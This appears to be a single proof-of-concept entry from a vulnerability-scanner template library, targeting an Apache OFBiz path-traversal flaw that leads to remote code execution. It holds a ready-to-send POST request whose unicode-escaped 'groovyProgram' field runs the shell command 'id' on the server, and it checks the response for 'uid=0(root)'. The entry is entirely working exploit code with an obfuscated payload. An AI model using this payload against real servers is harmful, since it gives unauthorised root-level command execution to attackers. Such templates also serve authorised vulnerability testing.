{
        'name': 'Apache OFBiz 路径遍历导致RCE漏洞',
        'poc': [{'requests':{
            'method': 'post',
            'payload': '/webtools/control/forgotPassword/%2e/%2e/ProgramExport',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            'data': {'groovyProgram': '\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0069\u0064\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b'},
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'uid=0(root)'
        }}]
    }